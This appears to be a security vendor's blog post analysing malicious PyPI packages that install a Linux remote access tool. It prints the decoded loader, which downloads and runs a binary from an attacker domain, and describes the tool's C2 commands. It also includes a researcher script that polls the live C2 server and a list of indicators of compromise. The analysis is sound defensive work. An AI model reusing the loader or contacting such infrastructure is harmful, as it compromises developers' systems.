---
publishDate: 2024-02-29T00:00:00Z
title: Novel ELF64 Remote Access Tool Embedded in Malicious PyPI Uploads
excerpt: Analyzing a Linux-targeted malware campaign on the Python Package Index.
category: Threat Intelligence
image: ~/assets/images/network-rat.jpg
tags:
  - malware
  - threat intelligence
---
## Introduction

On 19 February, Vipyr Security scanning services notified us of a malicious upload to the Python Package Index by the name `real-ids`.
This Python package, and subsequent uploads attributed to the same threat actor, contains 'remote access tool' capabilities-- that is,
remote code execution, remote file upload and download, and a beaconing service to an HTTPS-based C2.

**Malicious Packages:**

| Package             | Upload Time (UTC)          |
| ------------------- | -------------------------- |
| real-ids@0.0.1      | 2024-02-19T13:47Z          |
| real-ids@0.0.2      | 2024-02-19T13:52Z          |
| real-ids@0.0.3      | 2024-02-20T01:43Z          |
| real-ids@0.0.4      | 2024-02-20T02:24Z          |
| real-ids@0.0.5      | 2024-02-20T02:30Z          |
| coloredtxt@0.0.1    | 2024-02-20T07:27Z (Benign) |
| coloredtxt@0.0.2    | 2024-02-20T08:55Z          |
| beautifultext@0.0.1 | 2024-02-20T11:17Z          |
| minisound@0.0.1     | 2024-02-21T12:51Z (Benign) |
| minisound@0.0.2     | 2024-02-28T12:43Z          |

## Analysis

### Staging

The malicious payload is placed in `os.py` files within typos of popular packages. During the initialization of the package, an import is
made from the `os.py` file, executing the payload. Payload occurs in a string of multiple base64 or hex encoding, although base64 was
only observed in `coloredtxt@0.0.2`. The threat actors obfuscation technique is fairly novice compared to others as they don't make any
attempt to try and circumvent our detection mechanisms each iteration.

![image](/images/elf64-blog/fig-1-hex-string.png)
*Hex encoded stage 1 payload.*

```python
platform = sys.platform[0:1]
print(sys.argv[0])
if platform != "w":
    try:
        url = 'hxxps://arcashop.org/boards.php?type=' + platform
        local_filename = os.environ['HOME'] + '/oshelper'
        os.system("curl --silent " + url + " --cookie 'oshelper_session=10237477354732022837433' --output " + local_filename)
        sleep(3) 
        
        os.system("chmod +x " + local_filename) 
        os.system(local_filename + " > /dev/null 2>&1 &")
    except ZeroDivisionError as error:
        sleep(0) 
    finally:
        sleep(0)
```

*Stage 1 payload after decoding.*

The payload is downloaded from the `pypi[.]online` or `arcashop[.]org` domain. Curl is invoked with `os.system` and sets the cookie
`oshelper_session` to `10237477354732022837433`. Interestingly, the malware seems to only target Linux systems. If the platform is
set to windows, it will not execute.

The two endpoints are both in a similar format, with the differences being the domain name and php file name. In both examples the url ends
with the parameter `type`, which should always be `l` for the Linux platform.

- `hxxps://pypi[.]online/cloud.php?type=`
- `hxxps://arcashop[.]org/boards.php?type=`

Despite our efforts this payload was resistant to many our attempts to download it, even when accessing from mobile, residential, cloud, and
business/education IP addresses. We're still unsure how we got a payload to fall out and it seemed to happen by chance.

### Binary analysis

The payload itself is an ELF binary targetting the x86_64 cpu architecture. The binary appears to have statically linked libcurl, but
isn't stripped so we can still view the function names!

- **XEncoding:** An XOR encryption and decryption function with a custom key.
- **AcceptRequest:** Retreives commands from the C2, decrypts them and performs actions.
- **FConnectProxy:** Resolves user parameters for `SendPost` function and time seeds random sources.
- **SendPost:** Primary function to send and receive data. During analysis the following headers were discovered:

```http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5786.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
Connection: Keep-Alive
```

With these headers, the data is sent in the following format:

```plaintext
lkjyhnmiop=%s&odldjshrn=%s&ikdiwoep=%s
```

If the request in unsuccessful it will print the error to `/tmp/xweb_log.md`:

![image](/images/elf64-blog/fig-2-xweb-log.png)

![image](/images/elf64-blog/fig-3-xweb-source.png)

The commands uncovered during the analysis are a simple set of commands allowing the adversary to upload files, download files,
check if an agent is alive, make the agent wait 4 hours, and run commands and retrieve the output from them.

- **Ping1**: `0x892` Send a 'Success' response to C2 and waits 4 hours before polling the C2 again.

![image](/images/elf64-blog/fig-4-ping-sleep.png)

- **Ping2**: `0x895` Send a 'Success' response to C2 and polls for another command instantly.

![image](/images/elf64-blog/fig-5-ping-immediate.png)

- **MsgDown**: `0x893` Upload Files

![image](/images/elf64-blog/fig-6-msg-down.png)

- **MsgUp**: `0x894` Download Files

![image](/images/elf64-blog/fig-7-msg-up.png)

- **MsgCmd**: `0x898` run command with commandline `%s 2>&1 &` and send results back to C2.

![image](/images/elf64-blog/fig-8-msg-cmd.png)

- **MsgRun**: `0x897` run command with commandline `%s 2>&1 &` and do not send results to C2.

![image](/images/elf64-blog/fig-9-msg-run.png)

Simple analysis on the protocol used to communicate to the C2 server reveals it uses `libcurl` to perform http requests.

The payload will respond with two codes back to the API:

- `0x89a:` Success
- `0x89b:` Failure

The payload will beacon to `hxxps://jdkgradle.com/jdk/update/check` every 100 seconds to receive commands from the C2. Here's a snippet
of a pcap we took while analysing the malware.

![image](/images/elf64-blog/fig-10-beacon-pcap.png)

### C2 Activity Analysis

In order to further analyze the intentions of the threat actors we decided to log commands from the command and control server.
There were three ways that we could go about this: binary patching, implementing the C2 protocol, or debugging. Since we'd
not done extensive analysis on the C2 protocol and binary patching is generally a hard thing to do we chose to debug the binary.

Since we wanted to extract any decrypted C2 payload responses we chose to break just after the `RecvPayload()` function was called
in the `AcceptRequest()` function. After some extra testing we decided we wanted to extract the responses that the client was sending
back to the server, so we chose to break at the `SendPayload()` function too.

![image](/images/elf64-blog/fig-11-payload-receipt.png)

To extract the decrypted payload all we needed to do was print the first argument of the `RecvPayload()` call, which would be populated
with the decrypted payload. We can find this the linked to the `rbx` register at instruction 0x00404f3c. For `SendPayload()`, since
symbols weren't stripped from the binary, we only needed to refer to the symbol `SendPayload`.

![image](/images/elf64-blog/fig-12-payload-patch.png)

To accomplish this, we wrote the following gdb script and ran it with `gdb ./local_file --command=script.gdb`.

```bash
break *SendPayload
commands
p *$rdi
c
end
break *0x00404f4f
commands
x/128x $rbx
c
end
set logging on
r
```

To date, we have only observed the command `0x892`, which translates to the `Ping1` command and the `2202` client
response, or `0x89a`, which translates to the success response.

After running this and waiting for for the C2 to beacon again we had another look at the code for `AcceptRequest()` function and
found it waited 4 hours each time. This prompted us to patch this particular branch and multiply the sleep time by 0 instead of 60 (0x3c)
which made it much easier for us to monitor the agent in realtime.

### C2 Protocol Analysis

To analyze the network traffic which was encrypted over SSL we setup Burpsuite as a proxy to capture the underlying http requests from
the agent. The Burpsuite setup was simple as we only had the free version and we only changed the target to: `jdkgradle.com` so we could
capture server responses. To forward requests through the Burpsuite proxy the `https_proxy` environment variable was used. Since the
backend was curl, we knew it would check for proxy environment variables before sending each request and send it via the proxy. By
default it didn't seem to check the authenticity of the server certificate either which allowed us to mitm with ease.

![image](/images/elf64-blog/fig-14-burp-request-monitoring.png)

After watching some of the traffic we gathered a general overview of the c2 protocol:

```bash
# Initial connection
Agent -> C2: lkjyhnmiop=<ID>&odldjshrn=odlsjdfhw&ikdiwoep=<something?> (hello im alive)
C2 -> Agent: OK (success)

Agent -> C2: lkjyhnmiop=<ID>&odldjshrn=dsaewqfewf (give me commands)
C2 -> Agent: <base64 encoded command>
Agent -> C2: lkjyhnmiop=1059787080&odldjshrn=content&ikdiwoep=<base64 encoded command response>
```

During the testing we could see the debug output as the network requests happened and we were able to associate certain activity with the network
requests.

![image](/images/elf64-blog/fig-15-request-response.png)

This is why setting the target was important as capturing server responses would be crucial as it would allow us to arbitrarily decode
payloads received from the C2 through other means, such as using curl to simulate the client. With this script we are able to simulate
a fake client to pull commands from the C2 server. This allows us to log commands, including their payloads to a text file for later review.

```bash
rm -f /tmp/log.txt; while [ 1 ]; do
  curl --silent -k https://jdkgradle.com/jdk/update/check \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5786.212 Safari/537.36" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: image/gif, image/x-bitmap, image/jpeg, image/pjepg, application/x-shockwave-flash, */*" \
  -d 'lkjyhnmiop=689321559&odldjshrn=odlsjdfhw&ikdiwoep=dUxxZhprM15UCmB%2B'

  RESP=$(curl --silent -k https://jdkgradle.com/jdk/update/check \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5786.212 Safari/537.36" \
  -H "Content-Type: application/x-www-form-urlencoded" -H "Accept: image/gif, image/x-bitmap, image/jpeg, image/pjepg, application/x-shockwave-flash, */*" \
  -d 'lkjyhnmiop=689321559&odldjshrn=dsaewqfewf')
  echo $(echo $RESP|md5sum):$RESP | tee -a /tmp/log.txt
done
```

## Closing Remarks

All packages have been reported to and removed by the Python Package Index administrators. A special thanks to our friends at
[Phylum](https://www.phylum.io/) for helping us with the initial payload, security administrators at PyPI for their rapid handling of
our reports, and Vipyr Security community contributors for the reversal and analysis of the malicious code.

## Appendix

- [Tria.ge report](https://tria.ge/240229-24b5hsfb2v)
- [Intezer analyze report](https://analyze.intezer.com/analyses/d4a4a5c5-ee86-43ec-a331-e80b2ce0f092)

### Indicators of Compromise (IoCs)

```json
[
  {
    "type": "file",
    "path": "/home/*/oshelper",
    "sha256": "973f7939ea03fd2c9663dafc21bb968f56ed1b9a56b0284acf73c3ee141c053c",
    "md5": "33c9a47debdb07824c6c51e13740bdfe"
  },
  {
    "type": "file",
    "path": "/tmp/xweb_log.md",
    "sha256": null,
    "md5": null
  },
  {
    "type": "domain",
    "name": "pypi[.]online",
  },
  {
    "type": "domain",
    "name": "arcashop[.]org"
  },
  {
    "type": "domain",
    "name": "jdkgradle[.]com"
  }
]
```
